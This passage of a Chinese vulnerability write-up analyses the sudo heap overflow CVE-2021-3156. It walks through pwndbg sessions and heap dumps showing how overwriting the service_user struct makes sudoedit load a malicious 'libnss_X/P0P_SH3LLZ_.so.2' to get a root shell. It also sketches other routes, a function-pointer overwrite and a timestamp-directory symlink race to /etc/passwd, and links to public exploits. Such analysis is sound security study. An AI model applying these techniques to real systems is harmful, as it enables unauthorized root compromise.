![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612783842950-29103c2f-a4ac-449b-8d7b-484ae10a8af5.png)

### 5、堆溢出&&getshell
退出gdb，重新调试程序，执行以下步骤才能正常到达溢出点：

```powershell
cyberangel@ubuntu:~/Desktop/My_CVE$ sudo su
Password: 
root@ubuntu:/home/cyberangel/Desktop/My_CVE# gdb poc
pwndbg> b execve
pwndbg> r
pwndbg> b nss_load_library 
pwndbg> c
pwndbg> dir /home/cyberangel/Desktop/sudo-1.8.21p2/plugins/sudoers
pwndbg> c
pwndbg> c
pwndbg> c
pwndbg> c
pwndbg> c
pwndbg> c
pwndbg> b sudoers.c:842
Breakpoint 3 at 0x7ffff5494c38: file ../../../plugins/sudoers/sudoers.c, line 842.
pwndbg> c
pwndbg> c
Continuing.

Breakpoint 3, set_cmnd () at ../../../plugins/sudoers/sudoers.c:842
842		if (NewArgc > 1) {
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────
*RAX  0x0
*RBX  0x0
*RCX  0x2
*RDX  0x555555793000 ◂— 0x0
*RDI  0x555555792f80 ◂— 0x0
*RSI  0x0
*R8   0x555555792f80 ◂— 0x0
 R9   0x0
 R10  0x55555577a010 ◂— 0x101000002000202
 R11  0x0
*R12  0x0
*R13  0x0
*R14  0x0
*R15  0x7fffffffea60 —▸ 0x55555557098c ◂— jae    0x555555570a03 /* 'sudoedit' */
*RBP  0x0
*RSP  0x7fffffffe680 —▸ 0x7fffffffe6d0 ◂— 0xffffffffffffffff
*RIP  0x7ffff5494c38 (sudoers_policy_main+920) ◂— cmp    dword ptr [rip + 0x238dc1], 1
─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────
 ► 0x7ffff5494c38 <sudoers_policy_main+920>    cmp    dword ptr [rip + 0x238dc1], 1 <0x7ffff56cda00>
   0x7ffff5494c3f <sudoers_policy_main+927>    jle    sudoers_policy_main+1744 <sudoers_policy_main+1744>
 
   0x7ffff5494c45 <sudoers_policy_main+933>    mov    r15, qword ptr [rip + 0x238c9c] <0x7ffff56cd8e8>
   0x7ffff5494c4c <sudoers_policy_main+940>    xor    r14d, r14d
   0x7ffff5494c4f <sudoers_policy_main+943>    mov    rdi, qword ptr [r15 + 8]
   0x7ffff5494c53 <sudoers_policy_main+947>    lea    rbx, [r15 + 8]
   0x7ffff5494c57 <sudoers_policy_main+951>    mov    r13, rbx
   0x7ffff5494c5a <sudoers_policy_main+954>    test   rdi, rdi
   0x7ffff5494c5d <sudoers_policy_main+957>    je     sudoers_policy_main+3856 <sudoers_policy_main+3856>
 
   0x7ffff5494c63 <sudoers_policy_main+963>    nop    dword ptr [rax + rax]
   0x7ffff5494c68 <sudoers_policy_main+968>    add    r13, 8
──────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────
In file: /home/cyberangel/Desktop/sudo-1.8.21p2/plugins/sudoers/sudoers.c
   837 		debug_return_int(ret);
   838 	    }
   839 	}
   840 
   841 	/* set user_args */
 ► 842 	if (NewArgc > 1) {
   843 	    char *to, *from, **av;
   844 	    size_t size, n;
   845 
   846 	    /* Alloc and build up user_args. */
   847 	    for (size = 0, av = NewArgv + 1; *av; av++)
──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffe680 —▸ 0x7fffffffe6d0 ◂— 0xffffffffffffffff
01:0008│      0x7fffffffe688 —▸ 0x7fffffffe770 —▸ 0x7fffffffe800 ◂— 0x0
02:0010│      0x7fffffffe690 ◂— 0x0
... ↓
04:0020│      0x7fffffffe6a0 ◂— 0x4
05:0028│      0x7fffffffe6a8 —▸ 0x7ffff54b4d80 (__func__.6884) ◂— jae    0x7ffff54b4df7 /* 'sudoers_policy_check' */
06:0030│      0x7fffffffe6b0 —▸ 0x555555784120 —▸ 0x555555786610 ◂— 'user=root'
07:0038│      0x7fffffffe6b8 ◂— 0x0
────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────
 ► f 0     7ffff5494c38 sudoers_policy_main+920
   f 1     7ffff5494c38 sudoers_policy_main+920
   f 2     7ffff548e22f sudoers_policy_check+143
   f 3     555555559677 main+1191
   f 4     555555559677 main+1191
   f 5     7ffff719abf7 __libc_start_main+231
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> p NewArgc
$1 = 4
pwndbg> 
```

然后步入到如下图所示的地方：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612772982197-5d0f0cd4-ee6c-41eb-85b1-22e9a850f36e.png)

根据前一篇文章分析的，malloc_size的大小是：116(0x74)，那么对齐分配之后的chunk_size应该为0x81，此时的内存：

```c
pwndbg> x/30gx 0x555555784320-0x10
0x555555784310:	0x0000000000000020	0x0000000000000081 #malloc_chunk
0x555555784320:	0x0000000000000000	0x0000000000000000
0x555555784330:	0x73000a33352e302e	0x666e6f632e766c6f
0x555555784340:	0x6f66202938000a2e	0x6c69617465642072
0x555555784350:	0x2074756f62612073	0x7070757320656874
0x555555784360:	0x6f6d20646574726f	0x000a666f20736564
0x555555784370:	0x0000008000080000	0xffffffff00060014
0x555555784380:	0x00000152ffffffff	0x0000000000000152
0x555555784390:	0x0000000000000000	0x0000000000000041 #next_chunk
0x5555557843a0:	0x00005555557843e0	0x0000000000000000
0x5555557843b0:	0x0000000100000000	0x0000555500000001
0x5555557843c0:	0x0000000000000000	0x0000000000000000
0x5555557843d0:	0x00007461706d6f63	0x0000000000000041
0x5555557843e0:	0x0000000000000000	0x0000000000000000
0x5555557843f0:	0x0000000100000000	0x0000000000000001

```

看一下next_chunk和它之后的chunk中存放的是什么：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612782990775-99f3867a-0d69-4550-8e51-00147a589fe7.png)

从上图知道next_chunk之后的chunk会存放service_user的结构体，来看一下溢出之后会发生什么（b sudoers.c:867）：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612783158817-5fb21739-8913-48e8-b676-7b05b188a0e0.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612783205556-feb90239-bc0d-485f-a931-cc6c484c7b78.png)

在前面知道要执行到这一步需要ni->library==NULL，因此需要利用漏洞写入多个\x00来达到目的。

溢出后可见成功用X/P0P_SH3LLZ_ 覆写了file服务规范的name字段，如上图所示。

在之后调用nss_load_library的过程中就可以得到如下图所示的效果。

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612784663280-62b4a7d3-6f1a-454e-9e85-230547373459.png)

继续运行可见成功调用修改的libnss_X/P0P_SH3LLZ_ .so.2:

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612774413134-8ce5b18e-1055-4c16-bbaa-168a6283a866.png)![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612774435832-72311277-e191-4b58-b22b-b334baf4c125.png)

最后调用恶意so来getshell：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612774637447-7df25e08-2f80-496b-92c7-c8ed5fa35898.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612774651769-3d856a87-dd81-4ce1-8c02-cc70d7c7f857.png)

> **<font style="color:#F5222D;">请注意，在进入进程sudoedit后若自己手残跳过了某一个重要步骤，请不要输入r重新调试（因为这样重新调试会使传入的sudoedit环境变量丢失从而无法加载恶意so），要退出gdb重新调试。</font>**
>

当程序使用 ___libc_dlopen 加载我们编写的恶意so时， 由于其中有 __attribute__ ((constructor)) 的魔术方法，因此加载 libc 后第一时间执行我们的代码。

## 一些重要的补充
### 1、堆布局
> [https://bestwing.me/CVE-2021-3156-analysis..html](https://bestwing.me/CVE-2021-3156-analysis..html)
>

上面我所写的内容只是表层现象，我们只是知道service user结构体被覆盖了，但是这需要堆溢出点和service user结构体相邻，那么要怎样对堆进行合理的布局？

> [https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)
>

上面的链接文章中提到了一些关于sudo堆布局的内容：

> in setlocale(), we malloc()ate and free() several LC environment variables (LC_CTYPE, LC_MESSAGES, LC_TIME, etc), thereby creating small holes at the very beginning of Sudo's heap (free fast or tcache chunks);
>

这里我们了解到了在setlocale()函数中会调用malloc和free对环境变量(LC_CTYPE, LC_MESSAGES, LC_TIME等)进行堆布局；在堆布局中需要明确的是，我们要让分配的user_args结构体与service_user 结构体两者间的距离越近越好，并且堆溢出之后不会使程序crash，因此，我们通过fuzz和手动调试的方法来风水堆布局。那么如何判断两者间的距离呢？ 

我们还是对poc文件进行调试，首先我们对分配user_args代码处下断， 即b sudoers.c:849，引入源码来到此处：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612849429234-144dca47-8f7f-4d18-803f-402465a0601d.png)

来看一下此时的bin情况：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612849582722-c099cef4-4128-4471-a5c0-3027f9ea7335.png)

这里的tcachebins是我们即将分配的user_args chunk，具体分配是哪个，取决于user_args的大小，在之前我们分析过将要malloc的大小为0x81，因此将会取出0x555555784320堆块。

然然后引入源码对nsswitch.c:338下断点，然后c一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612850293827-0a362e6a-ebed-40b5-a21c-44e51ec4c4f6.png)

获取 ni 的地址， 与上面的 tcachebins 进行比较：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612850370183-a0ba0eab-8a23-4334-8232-0c7d76547ff1.png)

可以得到我这个脚本的偏移为：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612850539202-07c4c03b-87cd-46f9-bc4d-fe8a01ba27e2.png)

> 128==0x80
>

再看一下ni的内容：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612850673394-f8f60a8e-cf08-4bfe-a998-d07ca69ad0f2.png)

将 ni->name 覆盖为 “X/P0P_SH3LLZ_” ,其余内容以 \0 覆盖，这里会涉及一个问题，那么就是如何传入\00 字符呢？ 我们知道参数和环境变量都是不允许写入 \x00的，否则将被截断。通过阅读代码和调试我们最终发现可以使用单独的 \\ 字符来作为一个 \x00 字符。

### 2、漏洞触发只能使用sudoedit
> [https://www.anquanke.com/post/id/231077](https://www.anquanke.com/post/id/231077)
>

之前说过，在 parse_args()会对启用了-s或-i的MODE_SHELL和MODE_RUN的sudo的参数加上 反斜杠 转义。

```c
//parse_args.c parse_args()
    /*
     * For shell mode we need to rewrite argv
     */
    if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
    ...
```

而 set_cmnd()函数中触发堆溢出前，会判断是否启用了 MODE_SHELL 和 MODE_RUN、MODE_EDIT、MODE_CHECK 中的一个。那么就存在一个矛盾，如果要触发漏洞就需要启用 MODE_SHELL，但是如果启用了 MODE_SHELL，在 parse_args()函数中就会对所有参数转义，触发漏洞的 \，将会被转义为 \\，这样就无法触发漏洞了。

```c
//sudoers.c set_cmnd()
    if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {    
    ...
    if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
    ...
```

所以这里 并没有使用 sudo，而是使用 sudoedit。原因在于如果使用 sudoedit，其还是会被软链接到使用 sudo命令，但是在 parse_args()函数中会自动设置 MODE_EDIT和不会重置 valid_flags，则 MODE_SHELL仍然在 valid_flags中 ，而且不会设置 MODE_RUN,这样就能跳过 parse_args()函数中转义参数的部分，同时满足 set_cmnd()函数中漏洞触发的部分。

```c
//parse_args.c parse_args()
#define DEFAULT_VALID_FLAGS     (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL) 
... 
int valid_flags = DEFAULT_VALID_FLAGS;     //valid_flags默认参数包含MODE_SHELL，不包含MODE_RUN
...
/* First, check to see if we were invoked as "sudoedit". */
    proglen = strlen(progname);
    if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
    progname = "sudoedit";
    mode = MODE_EDIT;    //设置MODE_EDIT
    sudo_settings[ARG_SUDOEDIT].value = "true";
    }
```

## 另外的思路
> [https://bbs.pediy.com/thread-265703-1.htm](https://bbs.pediy.com/thread-265703-1.htm)
>

这篇文章只是分析了通过覆写 service_user 结构体达到getshell的目的，但是还有两种漏洞利用的方式并没有分析：

### 1、通过覆写 sudo_hook_entry 结构体
这是一个被分配到heap上的结构体，可以通过堆溢出覆写其中的函数指针getenv_fn（他指向的函数存在于sudo.so中，并且在sudo.so的开头有对execv的调用），而对于其的调用又和execve其one_gadgets的参数很像。

所以思路如下：

通过堆溢出，劫持函数指针getenv_fn，在存在ALSR的情况下进行部分覆写（低两字节为 0x8a00），然后爆破execv函数的地址，最后通过execv以root来执行我们自己的文件。（比如我们的文件叫："SYSTEMD_BYPASS_USERDB"，这是正常执行getenv_fn中的第一个参数）

该部分代码位于 `src/hooks.c，思路已经有公开的利用代码：

> (https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156)
>

### 2、通过覆写 def_timestampdir 结构体
sudo有这样一种行为，大致就是会在我们的工作目录下创建一些属于root用户的目录。每个这样的目录下都有且仅有一个文件：Sudo's timestamp file。 如果我们尝试将def_timestampdir覆盖为一个不存在的目录。然后我们可以与sudo的ts_mkdirs()竞争，创建一个指向任意文件的符号链接。并且尝试打开这个文件，向其中写入一个struct timestamp_entry。我们可以符号链接将其指向/etc/passwd，然后以root打开他，然后实现任意用户的注入从而root。

> github上似乎也有poc：
>
> https://github.com/r4j0x00/exploits/blob/master/CVE-2021-3156/exploit.c
>

# 总结
通过堆溢出劫持堆上的struct service_user结构体中的library指针为NULL以通过一些检查。 接着覆写service_user中的name变量为"X/X"，这样做的目的在于，当函数正常执行时，会做如下的文件路径拼接："libnss" + name + ".so.2"，正常情况下是：libnss_systemd.so.2，而当我们劫持了name后就变成了："libnss_X/P0P_SH3LLZ_.so.2"，然后使用___libc_dlopen进行加载。而在lib中的_init函数是constructor魔术方法，那么他会作为初始的构造函数在main前执行，通过执行恶意的so中的_init来root。









